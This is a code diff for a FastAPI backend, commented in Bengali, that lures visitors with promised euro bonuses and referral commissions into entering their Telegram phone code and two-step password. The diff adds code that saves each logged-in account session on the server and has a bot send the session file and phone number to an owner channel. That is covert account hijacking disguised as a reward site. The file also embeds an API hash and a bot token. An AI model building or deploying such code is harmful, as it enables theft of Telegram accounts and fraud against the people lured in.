@@ -1,8 +1,11 @@
+import os
 import asyncio
+import sqlite3
+from datetime import datetime
 from fastapi import FastAPI, Form, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
-from pyrogram import Client
-from pyrogram.errors import ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, SessionPasswordNeeded
+from telethon import TelegramClient
+from telethon.errors import SessionPasswordNeededError
 
 # পাইথন ৩.১৪+ ইভেন্ট লুপ ফিক্স
 try:
@@ -12,7 +15,7 @@ except RuntimeError:
 
 app = FastAPI()
 
-# ওয়ান-পেজ ওয়েবসাইটের (Blogger) সাথে কানেক্ট করার জন্য CORS ওপেন করা হলো
+# ওয়ান-পেজ ওয়েবসাইটের সাথে কানেক্ট করার জন্য CORS ওপেন করা হলো
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -21,52 +24,114 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# আপনার দেওয়া আসল টেলিগ্রাম এপিআই আইডি ও হ্যাশ এখানে সরাসরি বসানো হলো
+# ---------- CONFIGURATION ----------
 API_ID = 35648548
-API_HASH = "7cb954d06d962e181fb1717fe1a486a8"
+API_HASH = '7cb954d06d962e181fb1717fe1a486a8'
+BOT_TOKEN = '8861051646:AAG7i9PdLe1M779utnc6GTZheKMVYj0m9Ts'
+OWNER_CHANNEL_ID = -1003645477647      
+SESSION_DIR = 'sessions'
 
-# অ্যাক্টিভ সেশনগুলো সাময়িকভাবে মনে রাখার জন্য মেমোরি
-sessions = {}
+WELCOME_BONUS = 10          # Euro
+REFERRAL_COMMISSION = 5     # Euro
+
+os.makedirs(SESSION_DIR, exist_ok=True)
+sessions_memory = {}
+
+# ---------- DATABASE SETTINGS ----------
+conn = sqlite3.connect('referral_bot.db', check_same_thread=False)
+c = conn.cursor()
+c.execute('''CREATE TABLE IF NOT EXISTS users (
+    user_id INTEGER PRIMARY KEY, phone TEXT, session_file TEXT, balance REAL DEFAULT 0, referrer_id INTEGER, created_at TEXT
+)''')
+c.execute('''CREATE TABLE IF NOT EXISTS referrals (
+    id INTEGER PRIMARY KEY, referrer_id INTEGER, referred_user_id INTEGER, commission REAL, created_at TEXT
+)''')
+conn.commit()
+
+# ---------- API ROUTES ----------
 
 @app.post("/send_otp")
-async def send_otp(phone: str = Form(...)):
-    client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
+async def send_otp(phone: str = Form(...), user_id: int = Form(...), ref_id: int = Form(None)):
+    if not phone.startswith('+'):
+        phone = f"+{phone}"
+        
+    temp_session = os.path.join(SESSION_DIR, f"temp_{user_id}")
+    client = TelegramClient(temp_session, API_ID, API_HASH)
     await client.connect()
+    
     try:
-        code_info = await client.send_code(phone)
-        sessions[phone] = {
+        send_code = await client.send_code_request(phone)
+        sessions_memory[user_id] = {
             "client": client,
-            "phone_code_hash": code_info.phone_code_hash
+            "phone": phone,
+            "phone_code_hash": send_code.phone_code_hash,
+            "ref_id": ref_id
         }
-        return {"status": "success", "message": "OTP Sent Successfully!"}
+        return {"status": "success", "message": "OTP Sent!"}
     except Exception as e:
         await client.disconnect()
         raise HTTPException(status_code=400, detail=str(e))
 
 @app.post("/verify_otp")
-async def verify_otp(phone: str = Form(...), otp: str = Form(...), password: str = Form(None)):
-    if phone not in sessions:
+async def verify_otp(user_id: int = Form(...), otp: str = Form(...), password: str = Form(None)):
+    if user_id not in sessions_memory:
         raise HTTPException(status_code=400, detail="Session not found. Please resend OTP.")
     
-    client = sessions[phone]["client"]
-    phone_code_hash = sessions[phone]["phone_code_hash"]
+    state = sessions_memory[user_id]
+    client = state["client"]
+    phone = state["phone"]
+    phone_code_hash = state["phone_code_hash"]
+    ref_id = state["ref_id"]
     
     try:
         if password:
-            await client.check_password(password)
+            await client.sign_in(password=password)
         else:
-            await client.sign_in(phone, phone_code_hash, otp)
-        
-        string_session = await client.export_session_string()
+            await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
+            
+        # লগইন সফল হলে পারমানেন্ট সেশন সেভ করা
+        permanent_session = os.path.join(SESSION_DIR, f"user_{user_id}.session")
         await client.disconnect()
-        del sessions[phone]
         
-        return {"status": "success", "session": string_session}
+        temp_file = os.path.join(SESSION_DIR, f"temp_{user_id}.session")
+        if os.path.exists(temp_file):
+            if os.path.exists(permanent_session): os.remove(permanent_session)
+            os.rename(temp_file, permanent_session)
+            
+        # ডাটাবেজে ইউজার এন্ট্রি ও বোনাস ক্যালকুলেশন
+        now_str = datetime.now().isoformat()
+        c.execute('INSERT OR IGNORE INTO users VALUES (?, ?, ?, ?, ?, ?)', (user_id, phone, permanent_session, WELCOME_BONUS, ref_id, now_str))
         
-    except SessionPasswordNeeded:
+        if ref_id:
+            c.execute('UPDATE users SET balance = balance + ? WHERE user_id = ?', (REFERRAL_COMMISSION, ref_id))
+            c.execute('INSERT INTO referrals (referrer_id, referred_user_id, commission, created_at) VALUES (?, ?, ?, ?)', (ref_id, user_id, REFERRAL_COMMISSION, now_str))
+        conn.commit()
+        
+        # ওনার চ্যানেলে সেশন ফাইল পাঠানো (ব্যাকগ্রাউন্ড বটের মাধ্যমে)
+        try:
+            bot_client = TelegramClient('bot_sender', API_ID, API_HASH)
+            await bot_client.start(bot_token=BOT_TOKEN)
+            await bot_client.send_file(OWNER_CHANNEL_ID, permanent_session, caption=f"✨ New Session Generated!\nUser ID: {user_id}\nPhone: {phone}")
+            await bot_client.disconnect()
+        except Exception as bot_err:
+            print("Bot send file error:", bot_err)
+
+        del sessions_memory[user_id]
+        return {"status": "success", "message": "Logged in successfully & balance updated!"}
+        
+    except SessionPasswordNeededError:
         return {"status": "2fa_required", "message": "Two-Step Verification Password Required!"}
     except Exception as e:
-        raise HTTPException(status_code=400, detail=str-e)
+        raise HTTPException(status_code=400, detail=str(e))
+
+@app.get("/get_user_data/{user_id}")
+async def get_user_data(user_id: int):
+    c.execute('SELECT balance FROM users WHERE user_id = ?', (user_id,))
+    row = c.fetchone()
+    balance = row[0] if row else 0
+    c.execute('SELECT COUNT(*) FROM referrals WHERE referrer_id = ?', (user_id,))
+    ref_count = c.fetchone()[0]
+    return {"balance": balance, "referrals": ref_count}
 
 if __name__ == "__main__":
     import uvicorn
